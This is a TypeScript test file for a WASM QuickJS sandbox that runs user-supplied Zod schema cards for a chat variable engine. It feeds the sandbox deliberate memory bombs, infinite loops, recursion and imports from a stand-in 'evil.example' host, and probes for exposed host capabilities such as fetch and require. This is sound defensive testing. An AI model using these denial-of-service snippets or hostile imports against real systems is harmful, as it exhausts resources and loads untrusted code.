// 網頁版 QuickJS 宿主（quickjs-host.ts：wasm 版 QuickJS 跑桌面同一支 bundle）在 Node 上的行為：共用 41 案與三張真卡
// 要與桌面基準逐項相同；上限（wasm Memory maximum、堆疊、期限）、失敗語意（整次失敗、之後不再接工）、loader 白名單、
// 卡片看不到宿主能力。真瀏覽器（iframe、CSP、主頁期限）另由 web/e2e/zod-isolation.mjs 測。
import { existsSync, readFileSync } from "node:fs";
import YAML from "yaml";
import { describe, expect, it } from "vitest";
import { zodFeedbackLine } from "@desktop/features/mvu-engine/zod-feedback";
import { EngineError, MEMORY_MAX_BYTES, type QuickJsHost } from "./quickjs-host";
import { createTestHost, createTestZodRunner } from "./test-runner";

const fixture = (name: string) => readFileSync(new URL(`../../../../../src/features/mvu-engine/fixtures/${name}`, import.meta.url), "utf8");
const REAL_GOLDEN = new URL("../../../../../TestCards/zod-cards-golden.json", import.meta.url);
const MVU_ZOD = "https://testingcf.jsdelivr.net/gh/StageDog/tavern_resource/dist/util/mvu_zod.js";
const MACROS = JSON.stringify({ user: "玩家", char: null });
const MESSAGE = "<UpdateVariable>_.set('x', 1);</UpdateVariable>";
const OLD = JSON.stringify({ stat_data: { x: 0 } });

/** 卡片 schema：transform 裡跑 `body` */
const transformCard = (body: string) =>
  `import { registerMvuSchema } from '${MVU_ZOD}';\nexport const Schema = z.object({ x: z.number().transform((v) => { ${body}; return v; }) });\nregisterMvuSchema(Schema);`;
/** 卡片 schema：載入時（模組頂層）先跑 `body` */
const loadCard = (body: string) => `import { registerMvuSchema } from '${MVU_ZOD}';\n${body};\nregisterMvuSchema(z.object({ x: z.number() }));`;

const BOMBS: [string, string][] = [
  ["字串", "const a = []; for (let i = 0; ; i++) a.push('x'.repeat(1 << 20) + i)"],
  ["物件", "const a = []; for (let i = 0; ; i++) a.push({ i, s: [i, i, i] })"],
  ["ArrayBuffer 小塊累加", "const a = []; for (;;) a.push(new ArrayBuffer(1 << 20))"],
  ["TypedArray", "const a = []; for (;;) a.push(new Float64Array(1 << 20))"],
];

async function caught(run: () => unknown): Promise<EngineError> {
  try {
    await run();
  } catch (error) {
    if (error instanceof EngineError) return error;
    throw error;
  }
  throw new Error("應該失敗卻成功了");
}

const soon = (ms = 5_000) => performance.now() + ms;
const parse = (host: QuickJsHost, at = soon()) => host.call("parse", [MESSAGE, OLD, MACROS], at);

describe("與桌面基準相同", () => {
  it("開局與 41 案逐項相同（回饋句同桌面）", async () => {
    const golden = JSON.parse(fixture("zod-corpus-golden.json")) as {
      init: { stat_data: Record<string, unknown> };
      cases: ({ name: string; message: string } & Record<string, unknown>)[];
    };
    const runner = createTestZodRunner(fixture("clean-zod-schema.txt"));
    const init = await runner.initialize(YAML.parse(fixture("clean-zod-initvar.yaml")) as Record<string, unknown>);
    expect(init).toEqual(golden.init);
    expect(golden.cases).toHaveLength(41);
    for (const { name, message, feedback, ...expected } of golden.cases) {
      const actual = await runner.parse(message, { stat_data: init.stat_data }, { user: "玩家", char: null });
      expect(actual, name).toEqual(expected);
      expect(actual.results.map(zodFeedbackLine), name).toEqual(feedback);
    }
  }, 60_000);

  // TestCards/ 是 gitignore 的本機測試卡（基準由 src/features/mvu-engine/quickjs-entry.test.ts 在 Node 產生）
  it.skipIf(!existsSync(REAL_GOLDEN))("三張真卡的開局與一批指令", async () => {
    const golden = JSON.parse(readFileSync(REAL_GOLDEN, "utf8")) as {
      name: string;
      schema: string;
      initvar: Record<string, unknown>;
      init: { stat_data: Record<string, unknown> };
      message: string;
      detailed: Record<string, unknown>;
    }[];
    for (const card of golden) {
      const runner = createTestZodRunner(card.schema);
      const init = await runner.initialize(card.initvar);
      expect(init.stat_data, card.name).toEqual(card.init.stat_data);
      const { feedback: _feedback, ...detailed } = card.detailed;
      expect(await runner.parse(card.message, { stat_data: init.stat_data }, { user: "玩家", char: null }), card.name).toEqual(detailed);
    }
  }, 60_000);
});

describe("記憶體上限：wasm Memory maximum 是硬上限", { timeout: 60_000 }, () => {
  it.each(BOMBS)("transform 期%s炸彈：整次失敗、線性記憶體不超過上限、之後不再接工", async (_name, body) => {
    const host = await createTestHost();
    host.load(transformCard(body), soon());
    const error = await caught(() => parse(host, soon(20_000)));
    expect(error.kind).toBe("memory");
    expect(host.memoryBytes).toBeLessThanOrEqual(MEMORY_MAX_BYTES);
    expect((await caught(() => parse(host))).kind).toBe("crashed");
  });

  it.each(BOMBS)("載入期%s炸彈：schema 載入失敗（同桌面歸載入失敗、訊息帶記憶體），線性記憶體不超過上限", async (_name, body) => {
    const host = await createTestHost();
    const error = await caught(() => host.load(loadCard(body), soon(20_000)));
    expect(error.kind).toBe("schema-load");
    expect(error.message).toMatch(/記憶體超過上限|丟出 null/);
    expect(host.memoryBytes).toBeLessThanOrEqual(MEMORY_MAX_BYTES);
  });

  it("出錯後 runner 丟掉那支、下一次重建可用", async () => {
    const runner = createTestZodRunner(transformCard("if (v === 1) { const a = []; for (;;) a.push(new ArrayBuffer(1 << 20)); }"));
    await expect(runner.parse(MESSAGE, { stat_data: { x: 0 } }, null)).rejects.toMatchObject({ kind: "memory" });
    const ok = await runner.parse("<UpdateVariable>_.set('x', 2);</UpdateVariable>", { stat_data: { x: 0 } }, null);
    expect(ok.table.stat_data).toEqual({ x: 2 });
  });
});

describe("其他上限與失敗語意", { timeout: 30_000 }, () => {
  it("無限遞迴：堆疊失敗，整次失敗（不是單條拒收）", async () => {
    const host = await createTestHost();
    host.load(transformCard("const f = (n) => f(n + 1) + 1; f(0)"), soon());
    expect((await caught(() => parse(host))).kind).toBe("stack");
  });

  it("transform 丟 null（物件炸彈耗盡時同樣丟 null）：整次失敗、歸記憶體", async () => {
    const host = await createTestHost();
    host.load(transformCard("throw null"), soon());
    expect((await caught(() => parse(host))).kind).toBe("memory");
  });

  it("transform 無窮迴圈：期限中斷", async () => {
    const host = await createTestHost();
    host.load(transformCard("for (;;) {}"), soon());
    expect((await caught(() => parse(host, soon(300)))).kind).toBe("deadline");
  });

  it("Promise／jobs 無窮迴圈：期限中斷", async () => {
    const host = await createTestHost();
    const started = performance.now();
    const error = await caught(() => host.load(loadCard("const f = () => { Promise.resolve().then(f); }; f()"), soon(2_000)));
    expect(performance.now() - started).toBeGreaterThan(1_500);
    expect(error.kind).toBe("deadline");
  });

  it("中斷觸發過就拒收，即使卡片吞掉中斷、最後註冊成功", async () => {
    const host = await createTestHost();
    const error = await caught(() => host.load(loadCard("try { for (;;) {} } catch (e) {}"), soon(300)));
    expect(error.kind).toBe("deadline");
    expect(host.loaded).toBe(false);
  });

  it("錯誤訊息先量長度再讀：超長訊息不整份搬出", async () => {
    const host = await createTestHost();
    const error = await caught(() => host.load(loadCard("throw new Error('x'.repeat(10_000_000))"), soon()));
    expect(error.kind).toBe("schema-load");
    expect(error.message.length).toBeLessThan(700);
    expect(error.message).toContain("過長略去");
  });
});

describe("loader 白名單與宿主能力（同桌面 sandbox probe）", { timeout: 30_000 }, () => {
  it("卡片看不到任何宿主能力與引擎把手；z、_、$ 在", async () => {
    const host = await createTestHost();
    const probe = `throw new Error(JSON.stringify({ present: ['fetch','XMLHttpRequest','WebSocket','require','process','Deno','std','os','importScripts','postMessage','self','navigator','document','window','Worker','WebAssembly','indexedDB','caches','setTimeout','TTMvu','__ttRegisterMvuSchema'].filter(k => typeof globalThis[k] !== 'undefined'), card: [typeof z, typeof _, typeof $] }))`;
    const error = await caught(() => host.load(loadCard(probe), soon()));
    expect(error.message).toContain('{"present":[],"card":["object","function","function"]}');
  });

  it.each([
    ["白名單外的靜態 import", `import x from 'https://evil.example/x.js';\n${loadCard("")}`],
    ["裸模組名", `import 'fs';\n${loadCard("")}`],
    ["直接 import 墊片內部名", `import { registerMvuSchema as r } from 'tt:mvu_zod';\nr(z.object({}));`],
    ["白名單外的動態 import", loadCard("await import('https://evil.example/x.js')")],
    ["沒有註冊 schema", "export const x = 1;"],
  ])("載入失敗：%s", async (_name, schema) => {
    const host = await createTestHost();
    expect((await caught(() => host.load(schema, soon()))).kind).toBe("schema-load");
  });

  it.each([
    ["靜態 import 帶版本", `import { registerMvuSchema } from 'https://cdn.jsdelivr.net/gh/StageDog/tavern_resource@1.2.3/dist/util/mvu_zod.js';\nregisterMvuSchema(z.object({}));`],
    ["動態 import 字面量（非頂層）", `import('${MVU_ZOD}').then((m) => m.registerMvuSchema(z.object({})));`],
    ["動態 import 非字面量（同桌面：執行時比對網址）", `const base = 'https://testingcf.jsdelivr.net/gh/StageDog/tavern_resource';\nconst m = await import(\`\${base}/dist/util/mvu_zod.js\`);\nm.registerMvuSchema(z.object({}));`],
  ])("白名單放行：%s", async (_name, schema) => {
    const host = await createTestHost();
    host.load(schema, soon());
    expect(host.loaded).toBe(true);
  });
});
